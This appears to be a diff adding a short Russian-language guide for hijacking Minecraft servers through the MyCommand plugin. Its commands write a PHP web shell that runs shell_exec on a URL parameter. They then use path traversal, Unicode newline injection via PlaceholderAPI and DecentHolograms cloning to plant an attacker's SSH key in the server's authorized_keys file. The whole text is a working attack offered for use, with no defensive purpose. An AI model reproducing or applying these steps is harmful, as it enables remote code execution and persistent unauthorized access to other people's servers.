@@ -1,0 +1,24 @@
+  Метод найден скроллом и кристаликом спасибо им за этот метод
+Способ (Любая версия, не тестировалось)
+  Создаем php-скрипт
+    /mycmd-edit dump command /dumpme
+    /mycmd-edit dump type RUN_CONSOLE
+    /mycmd-edit dump runcmd add $log$<?php echo shell_exec($_GET['e'e]): ?>
+    /mycmd-edit dump log_filename dump.php
+   Открываем через браузер айпишник этого сервера с именем созданного файла
+   Образец: http://127.0.0.1:80/dump.php?e=LINUX-COMMAND
+
+   Создаем ключ-SSH (Подтверждено)
+     /papi ecloud download Unicode
+     /papi reload
+     /mycmd-edit *название* command /*команда*    
+     /mycmd-edit *название* type RUN_CONSOLE
+     открываем cmd или powershell и пишем ssh-keygen
+     после чего открываем файл название ключа.pub и выбираем там все до названия вашего пк
+     /mycmd-edit *название* runcmd add $log$%unicode_000A%ключ
+     /mycmd-edit *название* log_filename директория корневой папки где находится папка пользователя/.ssh/authorized_keys пример /../../../../.ssh/authorized_keys
+     пишем /*ваша команда*
+     далее пишем ssh пользователь от которого запущен сервер@айпи -i ./название ключа
+     если папки ssh нету или у вас не получается создать ключ на помощь идет decentholograms
+     /dh create *название*
+     /dh clone *название* путь к корневой папке/.ssh/*название* пример /../../../../.ssh/test
